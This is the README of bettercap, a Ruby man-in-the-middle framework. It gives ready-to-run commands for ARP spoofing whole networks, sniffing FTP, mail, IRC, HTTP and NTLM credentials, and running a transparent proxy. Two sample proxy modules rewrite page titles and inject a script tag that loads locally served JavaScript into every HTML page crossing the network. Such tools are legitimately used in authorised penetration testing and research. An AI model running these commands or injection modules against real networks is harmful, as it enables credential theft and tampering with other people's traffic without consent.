BETTERCAP
==

Copyleft of **Simone 'evilsocket' Margaritelli**.  
http://www.evilsocket.net/

http://www.bettercap.org/
---

**bettercap** is a complete, modular, portable and easily extensible **MITM** tool and framework with every kind of diagnostic
and offensive feature you could need in order to perform a man in the middle attack.

MOTIVATIONS
===

> Yet another MITM tool? C'mon, really?!!?

This is exactly what you are thinking right now, isn't it? :D
But allow yourself to think about it for 5 more minutes ... what you should be really asking is:

> Does a complete, modular, portable and easy to extend MITM tool actually exist?

If your answer is "ettercap", let me tell you something:

* ettercap **was** a great tool, but it made its time.
* ettercap filters **do not** work most of the times, are outdated and hard to implement due to the specific language they're implemented in.
* ettercap is freaking **unstable** on big networks ... try to launch the host discovery on a bigger network rather than the usual /24 ;)
* yeah you can see connections and raw pcap stuff, **nice toy**, but **as a professional researcher I want to see only relevant stuff**.
* unless you're a C/C++ developer, you can't easily extend ettercap or make your own module.

Indeed you could use more than just one tool ... maybe [arpspoof](http://linux.die.net/man/8/arpspoof) to perform the actual poisoning, [mitmproxy](http://mitmproxy.org) to intercept HTTP stuff and inject your payloads and so forth ... I don't know about you, but I **hate** when I need to use a dozen of tools just to perform one single attack, especially when I need to do some black magic in order to make all of them work on my distro or on OSX ... what about the [KISS](https://en.wikipedia.org/wiki/KISS_principle) principle?

So **bettercap** was born ( isn't the name pure genius? XD ) ...

HOST DISCOVERY + ARP MAN IN THE MIDDLE
=== 

You can target the whole network or a single known address, it doesn't really matter, bettercap arp spoofing capabilities and its multiple hosts discovery agents will do the dirty work for you.  
Just launch the tool and wait for it to do its job ... again, [KISS!](https://en.wikipedia.org/wiki/KISS_principle)

![credentials](https://raw.github.com/evilsocket/bettercap/master/pics/discovery.png)

CREDENTIALS SNIFFER
===

The built in sniffer is currently able to dissect and print from the network the following informations:

- URLs being visited.
- HTTPS host being visited.
- HTTP POSTed data.
- HTTP Basic and Digest authentications.
- FTP credentials.
- IRC credentials.
- POP, IMAP and SMTP credentials.
- NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.

![credentials](https://raw.github.com/evilsocket/bettercap/master/pics/credentials.png)

**Examples**

Default sniffer mode, all parsers enabled:
    
    sudo bettercap -X
    
Enable sniffer and load only specified parsers:
    
    sudo bettercap -X -P "FTP,HTTPAUTH,MAIL,NTLMSS"

Enable sniffer + all parsers and parse local traffic as well:
    
    sudo bettercap -X -L
    
MODULAR TRANSPARENT PROXY
===

A modular transparent proxy can be started with the --proxy argument, by default it won't do anything 
but logging HTTP requests, but if you specify a **--proxy-module** argument you will be able to load
your own modules and manipulate HTTP traffic as you like.  

![credentials](https://raw.github.com/evilsocket/bettercap/master/pics/proxy.png)

**Examples**

Enable proxy on default ( 8080 ) port with no modules ( quite useless ): 
    
    sudo bettercap --proxy

Enable proxy and use a custom port:
    
    sudo bettercap --proxy --proxy-port=8081
    
Enable proxy and load the module **example_proxy_module.rb**:
    
    sudo bettercap --proxy --proxy-module=example_proxy_module.rb

Disable spoofer and enable proxy ( stand alone proxy mode ):

    sudo bettercap -S NONE --proxy

**Modules**

You can easily implement a module to inject data into pages or just inspect the
requests/responses creating a ruby file and passing it to bettercap with the --proxy-module argument, 
the following is a sample module that injects some contents into the title tag of each html page.

```ruby
class HackTitle < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '<title>', '<title> !!! HACKED !!! ' )
    end
  end
end
```

BUILTIN HTTP SERVER
===

You want to serve your custom javascript files on the network? Maybe you wanna inject some custom
script or image into HTTP responses using a transparent proxy module but you got no public server
to use? **no worries dude** :D  
A builtin HTTP server comes with bettercap, allowing you to serve custom contents from your own
machine without installing and configuring other softwares such as Apache, nginx or lighttpd. 

You could use a **proxy module** like the following:

```ruby
class InjectJS < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
      # get the local interface address and HTTPD port
      localaddr = Context.get.iface[:ip_saddr]
      localport = Context.get.options[:httpd_port]
      # inject the js
      response.body.sub!( '</title>', "<script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script></title>" )
    end
  end
end
```

And then use it to inject the js file in every HTTP response of the network, using bettercap itself
to serve the file:

    sudo bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb 

HOW TO INSTALL
===

**Stable Release ( GEM )**
    
    gem install bettercap
    
**From Source**
    
    git clone https://github.com/evilsocket/bettercap
    cd bettercap
    gem build bettercap.gemspec
    sudo gem install bettercap*.gem

DEPENDS
===

All dependencies will be automatically installed through the GEM system.

- colorize (**gem install colorize**)
- packetfu (**gem install packetfu**)
- pcaprub  (**gem install pcaprub**) [sudo apt-get install ruby-dev libpcap-dev]